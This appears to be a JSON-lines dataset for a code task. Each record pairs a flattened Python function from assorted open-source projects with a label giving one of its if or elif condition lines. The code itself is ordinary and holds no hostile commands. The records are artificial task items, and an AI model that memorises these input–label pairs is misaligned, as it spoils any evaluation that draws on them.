{"input": "def flatten_dict(self, request): dct = super(KnowledgeFolderHandler, self).flatten_dict(request) dct[\"knowledgeType_id\"] = None parent = request.data.get(\"parent\") if parent: parent = getOrNone(KnowledgeFolder, pk=parent) if not parent or not request.user.profile.has_permission(parent, mode=\"x\"): request.data[\"parent\"] = None return dct", "label": "if not parent or not request . user . profile . has_permission ( parent , mode = \"x\" ) :"}
{"input": "def delete_oidc_session_tokens(session): if session: if \"oidc_access_token\" in session: del session[\"oidc_access_token\"] if \"oidc_id_token\" in session: del session[\"oidc_id_token\"] if \"oidc_id_token_expiration\" in session: del session[\"oidc_id_token_expiration\"] if \"oidc_login_next\" in session: del session[\"oidc_login_next\"] if \"oidc_refresh_token\" in session: del session[\"oidc_refresh_token\"] if \"oidc_state\" in session: del session[\"oidc_state\"]", "label": "if \"oidc_id_token\" in session :"}
{"input": "def prepare_text(text, style): body = [] for fragment, sty in parse_tags(text, style, subs.styles): fragment = fragment.replace(r\"\\h\", \" \") fragment = fragment.replace(r\"\\n\", \"\\n\") fragment = fragment.replace(r\"\\N\", \"\\n\") if sty.italic: fragment = \"<i>%s</i>\" % fragment if sty.underline: fragment = \"<u>%s</u>\" % fragment if sty.strikeout: fragment = \"<s>%s</s>\" % fragment if sty.drawing: raise ContentNotUsable body.append(fragment) return re.sub(\"\\n+\", \"\\n\", \"\".join(body).strip())", "label": "if sty . strikeout :"}
{"input": "def test_reduce_different_name( ray_start_distributed_2_nodes_4_gpus, group_name, dst_rank ): world_size = 4 actors, _ = create_collective_workers(num_workers=world_size, group_name=group_name) results = ray.get([a.do_reduce.remote(group_name, dst_rank) for a in actors]) for i in range(world_size): if i == dst_rank: assert (results[i] == cp.ones((10,), dtype=cp.float32) * world_size).all() else: assert (results[i] == cp.ones((10,), dtype=cp.float32)).all()", "label": "if i == dst_rank :"}
{"input": "def _find_docstrings(self, filename): # A replacement for trace.find_strings() which was deprecated in # Python 3.2 and removed in 3.6. strs = set() prev = token.INDENT # so module docstring is detected as docstring with tokenize_open(filename) as f: tokens = tokenize.generate_tokens(f.readline) for ttype, tstr, start, end, line in tokens: if ttype == token.STRING and prev == token.INDENT: strs.update(range(start[0], end[0] + 1)) prev = ttype return strs", "label": "if ttype == token . STRING and prev == token . INDENT :"}
{"input": "def on_click(self, event): button = event[\"button\"] if button in [self.button_next, self.button_previous]: if self.station_data: self.scrolling = True if button == self.button_next: self.active_index += 1 elif button == self.button_previous: self.active_index -= 1 self.active_index %= self.count_stations else: self.py3.prevent_refresh() elif button == self.button_refresh: self.idle_time = 0 else: self.py3.prevent_refresh()", "label": "if self . station_data :"}
{"input": "def findRule(instance, ruleSet): \"\"\"find the rule(s) that matches the feture vector passed\"\"\" # print(\"*Looking for rule match for Feature vector: \" + featuresToString(instance)) ruleNumber = 0 # counter to track rule number ruleMatches = [] # will hold all rule numbers that matched for rule in ruleSet: if ruleMatch(rule, instance): ruleMatches.append(ruleNumber) counts[ ruleNumber ] += 1 # update global histogram of rule matches for stats reporting if False: print(\" ruleMatch found at rule #\" + str(ruleNumber)) print(\" \", end=\"\") printRule(rule) ruleNumber += 1 return ruleMatches", "label": "if False :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 18: length = d.getVarInt32() tmp = ProtocolBuffer.Decoder(d.buffer(), d.pos(), d.pos() + length) d.skip(length) self.mutable_peer_ip().TryMerge(tmp) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 18 :"}
{"input": "def _check_no_tensors(parameters: Params): flat_params = tf.nest.flatten(parameters.params) for p in flat_params: if isinstance(p, Params): _check_no_tensors(p) if tf.is_tensor(p): raise TypeError( \"Saw a `Tensor` value in parameters:\\n {}\".format(parameters) )", "label": "if isinstance ( p , Params ) :"}
{"input": "def all_zinc_rsc_invalid_dep_keys(invalid_deps): \"\"\"Get the rsc key for an rsc-and-zinc target, or the zinc key for a zinc-only target.\"\"\" for tgt in invalid_deps: # None can occur for e.g. JarLibrary deps, which we don't need to compile as they are # populated in the resolve goal. tgt_rsc_cc = compile_contexts[tgt].rsc_cc if tgt_rsc_cc.workflow is not None: # Rely on the results of zinc compiles for zinc-compatible targets yield self._key_for_target_as_dep(tgt, tgt_rsc_cc.workflow)", "label": "if tgt_rsc_cc . workflow is not None :"}
{"input": "def characters(self, ch): if self.Text_tag: if self.Summary_tag: self.Summary_ch += ch elif self.Attack_Prerequisite_tag: self.Attack_Prerequisite_ch += ch elif self.Solution_or_Mitigation_tag: self.Solution_or_Mitigation_ch += ch elif self.CWE_ID_tag: self.CWE_ID_ch += ch", "label": "elif self . Solution_or_Mitigation_tag :"}
{"input": "def load_tool_from_cache(self, config_file, recover_tool=False): tool_cache = getattr(self.app, \"tool_cache\", None) tool = None if tool_cache: if recover_tool: tool = tool_cache.get_removed_tool(config_file) else: tool = tool_cache.get_tool(config_file) return tool", "label": "if recover_tool :"}
{"input": "def _generate_examples(self, archive, directory, labeled=True): \"\"\"Generate IMDB examples.\"\"\" # For labeled examples, extract the label from the path. reg_path = \"(?P<label>neg|pos)\" if labeled else \"unsup\" reg = re.compile( os.path.join(\"^%s\" % directory, reg_path, \"\").replace(\"\\\\\", \"\\\\\\\\\") ) for path, imdb_f in archive: res = reg.match(path) if not res: continue text = imdb_f.read().strip() label = res.groupdict()[\"label\"] if labeled else -1 yield path, { \"text\": text, \"label\": label, }", "label": "if not res :"}
{"input": "def startInputThread(self): # cv.acquire() # Fix Python 2.x. global input try: input = raw_input except NameError: pass while True: cmd = ( self._queuedCmds.pop(0) if len(self._queuedCmds) else input(self.getPrompt()).strip() ) wait = self.execCmd(cmd) if wait: self.acceptingInput = False self.blockingQueue.get(True) # cv.wait() # self.inputThread.wait() self.acceptingInput = True", "label": "if wait :"}
{"input": "def assertS_IS(self, name, mode): # test format, lstrip is for S_IFIFO fmt = getattr(stat, \"S_IF\" + name.lstrip(\"F\")) self.assertEqual(stat.S_IFMT(mode), fmt) # test that just one function returns true testname = \"S_IS\" + name for funcname in self.format_funcs: func = getattr(stat, funcname, None) if func is None: if funcname == testname: raise ValueError(funcname) continue if funcname == testname: self.assertTrue(func(mode)) else: self.assertFalse(func(mode))", "label": "if funcname == testname :"}
{"input": "def test_compatibility(self) -> None: for expected, user_agent in self.data: result = self.client_get(\"/compatibility\", HTTP_USER_AGENT=user_agent) if expected == \"ok\": self.assert_json_success(result) elif expected == \"old\": self.assert_json_error(result, \"Client is too old\") else: assert False # nocoverage", "label": "elif expected == \"old\" :"}
{"input": "def getBranchFromFile(): global _gitdir branch = None if _gitdir: headFile = os.path.join(_gitdir, \"HEAD\") if os.path.isfile(headFile): with open(headFile, \"r\", encoding=\"utf-8\") as f: line = f.readline() if line: if line.startswith(\"ref\"): branch = line.split(\"/\")[-1].strip() else: branch = \"HEAD\" return branch", "label": "if os . path . isfile ( headFile ) :"}
{"input": "def get_job_parameters_dict(self, job_parameters: RunParameters = None): if job_parameters: if int(self.job_runtime_conf.get(\"dsl_version\", 1)) == 2: self.job_runtime_conf[\"job_parameters\"][\"common\"] = job_parameters.to_dict() else: self.job_runtime_conf[\"job_parameters\"] = job_parameters.to_dict() return self.job_runtime_conf[\"job_parameters\"]", "label": "if int ( self . job_runtime_conf . get ( \"dsl_version\" , 1 ) ) == 2 :"}
{"input": "def ConnectHandler(*args, **kwargs): \"\"\"Factory function selects the proper class and creates object based on device_type.\"\"\" device_type = kwargs[\"device_type\"] if device_type not in platforms: if device_type is None: msg_str = platforms_str else: msg_str = telnet_platforms_str if \"telnet\" in device_type else platforms_str raise ValueError( \"Unsupported 'device_type' \" \"currently supported platforms are: {}\".format(msg_str) ) ConnectionClass = ssh_dispatcher(device_type) return ConnectionClass(*args, **kwargs)", "label": "if device_type is None :"}
{"input": "def get_next_parent_entities(item, pids): ret = list() for [parent, entity_id] in parents[item]: if entity_id in pids: continue if parent in entities: ret.append(parent) else: pids.append(entity_id) for p in get_next_parent_entities(parent, pids): ret.append(p) return ret", "label": "if entity_id in pids :"}
{"input": "def load(self, data): ckey = None for key, val in _rx_cookie.findall(data): if key.lower() in _c_keys: if ckey: self[ckey][key] = _unquote(val) elif key[0] == \"$\": # RFC2109: NAMEs that begin with $ are reserved for other uses # and must not be used by applications. continue else: self[key] = _unquote(val) ckey = key", "label": "if key . lower ( ) in _c_keys :"}
{"input": "def getIdentifier(self): start = self.index self.index += 1 while self.index < self.length: ch = self.ccode() if ch == 0x5C: # Blackslash (U+005C) marks Unicode escape sequence. self.index = start return self.getEscapedIdentifier() if isIdentifierPart(ch): self.index += 1 else: break return self.source[start : self.index]", "label": "if ch == 0x5C :"}
{"input": "def test_floats_unequal_float(self): try: self.assertEqual( np.array([[1, 2], [3, 4.5]], dtype=np.float32), np.array([[1, 2], [3, 5]], dtype=np.float32), ) except AssertionError as e: if not str(e).startswith(\"Arrays not almost equal to 6 decimals\"): raise self.failureException(\"Float array mismatch error not raised.\")", "label": "if not str ( e ) . startswith ( \"Arrays not almost equal to 6 decimals\" ) :"}
{"input": "def _set_counts(self): self[\"regions_count\"] = len(self[\"regions\"]) for _, key in self._children: # VPCs should not be counted as resources. They exist whether you have resources or not, # so counting them would make the report confusing. if key == \"vpcs\": continue self[key + \"_count\"] = sum( [region[key + \"_count\"] for region in self[\"regions\"].values()] )", "label": "if key == \"vpcs\" :"}
{"input": "def total_form_count(self): \"\"\"Returns the total number of forms in this FormSet.\"\"\" if self.data or self.files: return self.management_form.cleaned_data[TOTAL_FORM_COUNT] else: initial_forms = self.initial_form_count() total_forms = initial_forms + self.extra # Allow all existing related objects/inlines to be displayed, # but don't allow extra beyond max_num. if initial_forms > self.max_num >= 0: total_forms = initial_forms elif total_forms > self.max_num >= 0: total_forms = self.max_num return total_forms", "label": "elif total_forms > self . max_num >= 0 :"}
{"input": "def mouse_down(self, evt): if self.parent.level: toolNo = self.toolNumberUnderMouse(evt.pos) if toolNo < 0 or toolNo > 8: return if evt.button == 1: self.selectTool(toolNo) if evt.button == 3: self.showToolOptions(toolNo)", "label": "if evt . button == 1 :"}
{"input": "def find_comment(line): \"\"\"Finds the index of a comment # and returns None if not found\"\"\" instring, instring_char = False, \"\" for i, char in enumerate(line): if char in ('\"', \"'\"): if instring: if char == instring_char: instring = False instring_char = \"\" else: instring = True instring_char = char elif char == \"#\": if not instring: return i return None", "label": "if not instring :"}
{"input": "def __getattr__(self, key): if key == key.upper(): if hasattr(self._django_settings, key): return getattr(self._django_settings, key) elif hasattr(self._default_settings, key): return getattr(self._default_settings, key) raise AttributeError( \"%r object has no attribute %r\" % (self.__class__.__name__, key) )", "label": "elif hasattr ( self . _default_settings , key ) :"}
{"input": "def replace_entities(match, entities=entities, encoding=encoding): ent = match.group() if ent[1] == \"#\": return unescape_charref(ent[2:-1], encoding) repl = entities.get(ent) if repl is not None: if hasattr(repl, \"decode\") and encoding is not None: try: repl = repl.decode(encoding) except UnicodeError: repl = ent else: repl = ent return repl", "label": "if hasattr ( repl , \"decode\" ) and encoding is not None :"}
{"input": "def test_floor_div(self): \"\"\"Util.number.floor_div\"\"\" self.assertRaises(TypeError, number.floor_div, \"1\", 1) for a in range(-10, 10): for b in range(-10, 10): if b == 0: self.assertRaises(ZeroDivisionError, number.floor_div, a, b) else: self.assertEqual( (a, b, int(math.floor(float(a) / b))), (a, b, number.floor_div(a, b)), )", "label": "if b == 0 :"}
{"input": "def get(self, method, **kws): resp = None if method in self.responses: resp = self.responses[method].pop(0) if \"validate\" in resp: checks = resp[\"validate\"][\"checks\"] resp = resp[\"validate\"][\"data\"] for check in checks: assert check in kws expected_value = checks[check] assert expected_value == kws[check] return resp", "label": "if \"validate\" in resp :"}
{"input": "def __add_changelisteners(self): NewPlayerSettlementHovered.subscribe(self.on_settlement_change) if self.__current_settlement is not None: inventory = self.__current_settlement.get_component(StorageComponent).inventory if not inventory.has_change_listener(self.refresh): inventory.add_change_listener(self.refresh)", "label": "if not inventory . has_change_listener ( self . refresh ) :"}
{"input": "def __call__(self, target): if \"weights\" not in target.temp: return True targets = target.temp[\"weights\"] for cname in target.children: if cname in targets: c = target.children[cname] deviation = abs((c.weight - targets[cname]) / targets[cname]) if deviation > self.tolerance: return True if \"cash\" in target.temp: cash_deviation = abs( (target.capital - targets.value) / targets.value - target.temp[\"cash\"] ) if cash_deviation > self.tolerance: return True return False", "label": "if cname in targets :"}
{"input": "def copyfileobj(src, dest, length=512): if hasattr(src, \"readinto\"): buf = bytearray(length) while True: sz = src.readinto(buf) if not sz: break if sz == length: dest.write(buf) else: b = memoryview(buf)[:sz] dest.write(b) else: while True: buf = src.read(length) if not buf: break dest.write(buf)", "label": "if sz == length :"}
{"input": "def test_api_history_restrict_cat(self): slot_sum = 0 # Loop over all categories in the fake history, plus the Default category cats = list(self.history_category_options) cats.extend(\"*\") for cat in cats: json = self._get_api_history({\"category\": cat}) slot_sum += len(json[\"history\"][\"slots\"]) # All results should be from the correct category for slot in json[\"history\"][\"slots\"]: if cat != \"*\": assert slot[\"category\"] == cat # Total number of slots should match the sum of all category slots json = self._get_api_history({\"limit\": self.history_size}) slot_total = len(json[\"history\"][\"slots\"]) assert slot_sum == slot_total", "label": "if cat != \"*\" :"}
{"input": "def checker(self): while True: try: ip = self.get_ip() except Exception as e: xlog.info(\"no ip left\") return try: res = self.check_ip.check_ip(ip, sni=host, host=host) except Exception as e: xlog.warn(\"check fail:%s except:%r\", e) continue if not res or not res.ok: xlog.debug(\"check fail:%s fail\", ip) continue self.write_ip(ip, res.domain, res.handshake_time)", "label": "if not res or not res . ok :"}
{"input": "def create_row_processor( self, context, path, loadopt, mapper, result, adapter, populators ): # look through list of columns represented here # to see which, if any, is present in the row. for col in self.columns: if adapter: col = adapter.columns[col] getter = result._getter(col, False) if getter: populators[\"quick\"].append((self.key, getter)) break else: populators[\"expire\"].append((self.key, True))", "label": "if getter :"}
{"input": "def indices(dimensions, dtype=int32, sparse=False): dimensions = tuple(dimensions) N = len(dimensions) output = [] s = dimensions for i, dim in enumerate(dimensions): idx = lax.iota(dtype, dim) if sparse: s = (1,) * i + (dim,) + (1,) * (N - i - 1) output.append(lax.broadcast_in_dim(idx, s, (i,))) if sparse: return tuple(output) return stack(output, 0) if output else array([], dtype=dtype)", "label": "if sparse :"}
{"input": "def load_cases(full_path): all_test_data = json.load(open(full_path), object_pairs_hook=OrderedDict) for test_data in all_test_data: given = test_data[\"given\"] for case in test_data[\"cases\"]: if \"result\" in case: test_type = \"result\" elif \"error\" in case: test_type = \"error\" elif \"bench\" in case: test_type = \"bench\" else: raise RuntimeError(\"Unknown test type: %s\" % json.dumps(case)) yield (given, test_type, case)", "label": "elif \"error\" in case :"}
{"input": "def _resolve_task_id(cls, task_id, log=None): if not task_id: task_id = cls.normalize_id(get_remote_task_id()) if task_id: log = log or get_logger(\"task\") log.info(\"Using task ID from env %s=%s\" % (TASK_ID_ENV_VAR[0], task_id)) return task_id", "label": "if task_id :"}
{"input": "def _build_contr_port_map(self, fabric_connected_ports, ports_info): contr_port_map = {} for port in fabric_connected_ports: contr = ports_info[port][\"contr\"] if not contr_port_map.get(contr): contr_port_map[contr] = [] contr_port_map[contr].append(port) LOG.debug(\"Controller port map: %s.\", contr_port_map) return contr_port_map", "label": "if not contr_port_map . get ( contr ) :"}
{"input": "def confirm(question): \"\"\"Prompts a given question and handles user input.\"\"\" valid = {\"yes\": True, \"y\": True, \"ye\": True, \"no\": False, \"n\": False, \"\": True} prompt = \" [Y/n] \" while True: print(BOLD + CYAN + question + prompt + END) choice = input().lower() if choice in valid: return valid[choice] print(\"Please respond with 'yes' or 'no' (or 'y' or 'n').\\n\")", "label": "if choice in valid :"}
{"input": "def __parse_query(self, model, iter_, data): f, b = self.__filter, self.__bg_filter if f is None and b is None: return True else: album = model.get_album(iter_) if album is None: return True elif b is None: return f(album) elif f is None: return b(album) else: return b(album) and f(album)", "label": "if album is None :"}
{"input": "def get_SV(self): result = [] for sparse_sv in self.SV[: self.l]: row = dict() i = 0 while True: row[sparse_sv[i].index] = sparse_sv[i].value if sparse_sv[i].index == -1: break i += 1 result.append(row) return result", "label": "if sparse_sv [ i ] . index == - 1 :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_hostname(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 10 :"}
{"input": "def getFileIdFromAlternateLink(altLink): loc = altLink.find(\"/d/\") if loc > 0: fileId = altLink[loc + 3 :] loc = fileId.find(\"/\") if loc != -1: return fileId[:loc] else: loc = altLink.find(\"/folderview?id=\") if loc > 0: fileId = altLink[loc + 15 :] loc = fileId.find(\"&\") if loc != -1: return fileId[:loc] controlflow.system_error_exit( 2, f\"{altLink} is not a valid Drive File alternateLink\" )", "label": "if loc != - 1 :"}
{"input": "def show_unknown_key_warning(name: Union[str, object], others: dict): if \"type\" in others: others.pop(\"type\") if len(others) > 0: keys = \", \".join(others.keys()) logger = logging.getLogger(__name__) if isinstance(name, object): name = name.__class__.__name__ logger.debug( f\"!!! {name}'s constructor args ({keys}) were ignored.\" f\"If they should be supported by this library, report this issue to the project :bow: \" f\"https://github.com/slackapi/python-slackclient/issues\" )", "label": "if isinstance ( name , object ) :"}
{"input": "def wrapper(*args, **kwargs): with capture_logs() as logs: try: function(*args, **kwargs) except Exception: # pragma: no cover if logs: print(\"%i errors logged:\" % len(logs), file=sys.stderr) for message in logs: print(message, file=sys.stderr) raise else: if logs: # pragma: no cover for message in logs: print(message, file=sys.stderr) raise AssertionError(\"%i errors logged\" % len(logs))", "label": "if logs :"}
{"input": "def _init_weight(self): for m in self.modules(): if isinstance(m, nn.Conv2d): n = m.kernel_size[0] * m.kernel_size[1] * m.out_channels m.weight.data.normal_(0, math.sqrt(2.0 / n)) elif isinstance(m, SyncBatchNorm): m.weight.data.fill_(1) m.bias.data.zero_() elif isinstance(m, nn.BatchNorm2d): m.weight.data.fill_(1) m.bias.data.zero_()", "label": "elif isinstance ( m , SyncBatchNorm ) :"}
{"input": "def cleanup(self): # some OBO ontologies have extra \".\" at the end of synonyms for i, s in enumerate(self.synonyms): if s[-1] == \".\": # only remove period if preceded by \"normal word\" if re.search(r\"\\b[a-z]{2,}\\.$\", s): c = s[:-1] print >>sys.stderr, \"Note: cleanup: '%s' -> '%s'\" % (s, c) self.synonyms[i] = c", "label": "if re . search ( r\"\\b[a-z]{2,}\\.$\" , s ) :"}
{"input": "def for_module(cls, modname: str) -> \"ModuleAnalyzer\": if (\"module\", modname) in cls.cache: entry = cls.cache[\"module\", modname] if isinstance(entry, PycodeError): raise entry return entry try: filename, source = cls.get_module_source(modname) if source is not None: obj = cls.for_string(source, modname, filename or \"<string>\") elif filename is not None: obj = cls.for_file(filename, modname) except PycodeError as err: cls.cache[\"module\", modname] = err raise cls.cache[\"module\", modname] = obj return obj", "label": "if isinstance ( entry , PycodeError ) :"}
{"input": "def GetDisplayNameOf(self, pidl, flags): item = pidl_to_item(pidl) if flags & shellcon.SHGDN_FORPARSING: if flags & shellcon.SHGDN_INFOLDER: return item[\"name\"] else: if flags & shellcon.SHGDN_FORADDRESSBAR: sigdn = shellcon.SIGDN_DESKTOPABSOLUTEEDITING else: sigdn = shellcon.SIGDN_DESKTOPABSOLUTEPARSING parent = shell.SHGetNameFromIDList(self.pidl, sigdn) return parent + \"\\\\\" + item[\"name\"] else: return item[\"name\"]", "label": "if flags & shellcon . SHGDN_FORADDRESSBAR :"}
{"input": "def transact_reraise(exc_class, exceptions): cls, exc, tb = exceptions[0] new_exc = None try: msg = \" \".join(tostring(arg) for arg in exc.args) if not issubclass(cls, TransactionError): msg = \"%s: %s\" % (cls.__name__, msg) new_exc = exc_class(msg, exceptions) new_exc.__cause__ = None reraise(exc_class, new_exc, tb) finally: del exceptions, exc, tb, new_exc", "label": "if not issubclass ( cls , TransactionError ) :"}
{"input": "def add_share(self, share): for filename, (share_hashes, verified_hashes) in self.known.iteritems(): if share.hash in share_hashes: break else: filename = self._add_line( \"%i %s\" % (5, share_type.pack(share.as_share()).encode(\"hex\")) ) share_hashes, verified_hashes = self.known.setdefault(filename, (set(), set())) share_hashes.add(share.hash) share_hashes, verified_hashes = self.known_desired.setdefault( filename, (set(), set()) ) share_hashes.add(share.hash)", "label": "if share . hash in share_hashes :"}
{"input": "def get_resolved_modules(self) -> Dict[str, ResolvedModule]: \"\"\"Get a {name: ResolvedModule} map of all resolved modules.\"\"\" resolved_modules = {} for name, mod in self._modules.items(): if not mod.has_unresolved_pointers: resolved_modules[name] = ResolvedModule( mod.module_name, mod.filename, mod.ast ) return resolved_modules", "label": "if not mod . has_unresolved_pointers :"}
{"input": "def stripe(request): amount = 1 response = None if request.method == \"POST\": form = CreditCardForm(request.POST) if form.is_valid(): data = form.cleaned_data credit_card = CreditCard(**data) merchant = get_gateway(\"stripe\") response = merchant.purchase(amount, credit_card) else: form = CreditCardForm(initial=GATEWAY_INITIAL[\"stripe\"]) return render( request, \"app/index.html\", { \"form\": form, \"amount\": amount, \"response\": response, \"title\": \"Stripe Payment\", }, )", "label": "if form . is_valid ( ) :"}
{"input": "def get(self, url): now = time.time() for entry in self.repos: if url.startswith(entry.url): if now < entry.timestamp + self.timeout: # print \"returning immediate Etrny\", entry return entry.url, entry.rev return entry.url, -1 return url, -1", "label": "if url . startswith ( entry . url ) :"}
{"input": "def cleanup(self): # some OBO ontologies have extra \".\" at the end of synonyms for i, s in enumerate(self.synonyms): if s[-1] == \".\": # only remove period if preceded by \"normal word\" if re.search(r\"\\b[a-z]{2,}\\.$\", s): c = s[:-1] print >>sys.stderr, \"Note: cleanup: '%s' -> '%s'\" % (s, c) self.synonyms[i] = c", "label": "if s [ - 1 ] == \".\" :"}
{"input": "def __get_field(cls, name): try: return cls._doc_type.mapping[name] except KeyError: # fallback to fields on the Index if hasattr(cls, \"_index\") and cls._index._mapping: try: return cls._index._mapping[name] except KeyError: pass", "label": "if hasattr ( cls , \"_index\" ) and cls . _index . _mapping :"}
{"input": "def command_is_enabled(self, item, focus): cmd = item.command if cmd: enabler_name = cmd + \"_enabled\" handler = focus while handler: enabler = getattr(handler, enabler_name, None) if enabler: return enabler() handler = handler.next_handler() return True", "label": "if enabler :"}
{"input": "def __getitem__(self, key): value = WeakValueDictionary.__getitem__(self, key) # check boundaries to minimiza duplicate references while len(self.queue) > 0 and self.queue[0][0] == key: # item at left end of queue pop it since it'll be appended # to right self.queue.popleft() # only append if item is not at right end of queue if not (len(self.queue) and self.queue[-1][0] == key): if len(self) >= self.maxsize or len(self.queue) >= self.maxsize * self.peakmult: self.cull() self.queue.append((key, value)) return value", "label": "if len ( self ) >= self . maxsize or len ( self . queue ) >= self . maxsize * self . peakmult :"}
{"input": "def post_init(self): if os.getenv(\"SCRCPY_LDD\"): if os.getenv(\"LD_LIBRARY_PATH\"): os.environ[\"LD_LIBRARY_PATH\"] += os.getenv(\"SCRCPY_LDD\") else: os.environ[\"LD_LIBRARY_PATH\"] = os.getenv(\"SCRCPY_LDD\")", "label": "if os . getenv ( \"LD_LIBRARY_PATH\" ) :"}
{"input": "def get_summary_output(event: events.Finished) -> Tuple[str, str, int]: parts = get_summary_message_parts(event.results) if not parts: message = \"Empty test suite\" color = \"yellow\" status_code = 0 else: message = f'{\", \".join(parts)} in {event.running_time:.2f}s' if event.results.has_failures or event.results.has_errors: color = \"red\" status_code = 1 else: color = \"green\" status_code = 0 return message, color, status_code", "label": "if event . results . has_failures or event . results . has_errors :"}
{"input": "def header_check(p_obj): \"\"\"Special disposition for the HTML <head> and <body> elements...\"\"\" if state.options.host_language in [ HostLanguage.xhtml, HostLanguage.html5, HostLanguage.xhtml5, ]: if node.nodeName == \"head\" or node.nodeName == \"body\": if not has_one_of_attributes(node, \"about\", \"resource\", \"src\", \"href\"): return p_obj else: return None", "label": "if node . nodeName == \"head\" or node . nodeName == \"body\" :"}
{"input": "def get_track_id_from_json(item): \"\"\"Try to extract video Id from various response types\"\"\" fields = [ \"contentDetails/videoId\", \"snippet/resourceId/videoId\", \"id/videoId\", \"id\", ] for field in fields: node = item for p in field.split(\"/\"): if node and isinstance(node, dict): node = node.get(p) if node: return node return \"\"", "label": "if node :"}
{"input": "def __init__(self, layers): super(Add, self).__init__() self.layer_names = [] self.layers = layers for i, layer in enumerate(self.layers): if layer.parent is None: if i == 0: layer.parent = \"input\" else: layer.parent = layers[i - 1].name if hasattr(layer, \"name\"): name = layer.name else: name = layer.__class__.__name__ + str(i) layer.name = name self.layer_names.append(name)", "label": "if layer . parent is None :"}
{"input": "def do_remove(self): if self.netconf.locked(\"dhcp\"): if not self.pid: pid = read_pid_file(\"/var/run/dnsmasq.pan1.pid\") else: pid = self.pid if not kill(pid, \"dnsmasq\"): logging.info(\"Stale dhcp lockfile found\") self.netconf.unlock(\"dhcp\")", "label": "if not kill ( pid , \"dnsmasq\" ) :"}
{"input": "def findStyleName(element, style): oldStyle = DOM.getAttribute(element, \"className\") if oldStyle is None: return -1 idx = oldStyle.find(style) # Calculate matching index lastPos = len(oldStyle) while idx != -1: if idx == 0 or (oldStyle[idx - 1] == \" \"): last = idx + len(style) if (last == lastPos) or ((last < lastPos) and (oldStyle[last] == \" \")): break idx = oldStyle.find(style, idx + 1) return idx", "label": "if idx == 0 or ( oldStyle [ idx - 1 ] == \" \" ) :"}
{"input": "def __str__(self): path = super(XPathExpr, self).__str__() if self.textnode: if path == \"*\": path = \"text()\" elif path.endswith(\"::*/*\"): path = path[:-3] + \"text()\" else: path += \"/text()\" if self.attribute is not None: if path.endswith(\"::*/*\"): path = path[:-2] path += \"/@%s\" % self.attribute return path", "label": "if path . endswith ( \"::*/*\" ) :"}
{"input": "def insert_after(self, sibling, row=None): if row is not None: value = self._get_marshalable(row[0]) if sibling is None: position = 0 else: position = self.get_path(sibling)[0] + 1 return self.insert_with_valuesv(position, [0], [value]) assert not self.ATOMIC return super(ObjectStore, self).insert_after(sibling, row)", "label": "if sibling is None :"}
{"input": "def source_synopsis(file): line = file.readline() while line[:1] == \"#\" or not strip(line): line = file.readline() if not line: break line = strip(line) if line[:4] == 'r\"\"\"': line = line[1:] if line[:3] == '\"\"\"': line = line[3:] if line[-1:] == \"\\\\\": line = line[:-1] while not strip(line): line = file.readline() if not line: break result = strip(split(line, '\"\"\"')[0]) else: result = None return result", "label": "if line [ - 1 : ] == \"\\\\\" :"}
{"input": "def _handle_rate_limit( self, exception: RedditAPIException ) -> Optional[Union[int, float]]: for item in exception.items: if item.error_type == \"RATELIMIT\": amount_search = self._ratelimit_regex.search(item.message) if not amount_search: break seconds = int(amount_search.group(1)) if \"minute\" in amount_search.group(2): seconds *= 60 if seconds <= int(self.config.ratelimit_seconds): sleep_seconds = seconds + min(seconds / 10, 1) return sleep_seconds return None", "label": "if \"minute\" in amount_search . group ( 2 ) :"}
{"input": "def get_html_help_exe(): \"\"\"Return HTML Help Workshop executable path (Windows only)\"\"\" if os.name == \"nt\": hhc_base = r\"C:\\Program Files%s\\HTML Help Workshop\\hhc.exe\" for hhc_exe in (hhc_base % \"\", hhc_base % \" (x86)\"): if osp.isfile(hhc_exe): return hhc_exe else: return", "label": "if osp . isfile ( hhc_exe ) :"}
{"input": "def get_net_bridge_owner(name_ignore, sysfspath): # Now magic to determine if the device is part of a bridge brportpath = os.path.join(sysfspath, \"brport\") try: if os.path.exists(brportpath): brlinkpath = os.path.join(brportpath, \"bridge\") dest = os.readlink(brlinkpath) (ignore, bridge) = os.path.split(dest) return bridge except: logging.exception(\"Unable to determine if device is shared\") return None", "label": "if os . path . exists ( brportpath ) :"}
{"input": "def get_timestamp(self): if not self._timedelta: url = \"https://%s%s/auth/time\" % (API_HOST, API_ROOT) response = get_response_object(url=url, method=\"GET\", headers={}) if not response or not response.body: raise Exception(\"Failed to get current time from Ovh API\") timestamp = int(response.body) self._timedelta = timestamp - int(time.time()) return int(time.time()) + self._timedelta", "label": "if not response or not response . body :"}
{"input": "def render(self, context): for var in self.vars: value = var.resolve(context, True) if value: first = render_value_in_context(value, context) if self.asvar: context[self.asvar] = first return \"\" return first return \"\"", "label": "if value :"}
{"input": "def test_loc_is_stochastic_parameter(self): param = iap.Laplace(iap.Choice([-100, 100]), 1) seen = [0, 0] for _ in sm.xrange(1000): samples = param.draw_samples((100,)) exp = np.mean(samples) if -100 - 10 < exp < -100 + 10: seen[0] += 1 elif 100 - 10 < exp < 100 + 10: seen[1] += 1 else: assert False assert 500 - 100 < seen[0] < 500 + 100 assert 500 - 100 < seen[1] < 500 + 100", "label": "elif 100 - 10 < exp < 100 + 10 :"}
{"input": "def get_data(self, path, prefix=\"\"): item = self.store[path] path = \"{}/{}\".format(prefix, path) keys = [i for i in item.keys()] data = {\"path\": path} # print(path) for k in keys: if not isinstance(item[k], h5py.Group): dataset = np.array(item[k].value) if type(dataset) is np.ndarray: if dataset.size != 0: if type(dataset[0]) is np.bytes_: dataset = [a.decode(\"ascii\") for a in dataset] data.update({k: dataset}) return data", "label": "if dataset . size != 0 :"}
{"input": "def __del__(self): try: if self._mpz_p is not None: if self._initialized: _gmp.mpz_clear(self._mpz_p) self._mpz_p = None except AttributeError: pass", "label": "if self . _initialized :"}
{"input": "def load(self, vocab_file): self.__term2id = {} self.__id2term = {} with open(vocab_file, \"r\", encoding=\"utf-8\") as fin: for line in fin.readlines(): fields = line.strip().split(\"\\t\") assert len(fields) == 5, \"Vocabulary file [%s] format error!\" % (vocab_file) term = fields[1] id_ = int(fields[2]) if term in self.__term2id: logger.error(\"Duplicate word [%s] in vocab file!\" % (term)) continue self.__term2id[term] = id_ self.__id2term[id_] = term", "label": "if term in self . __term2id :"}
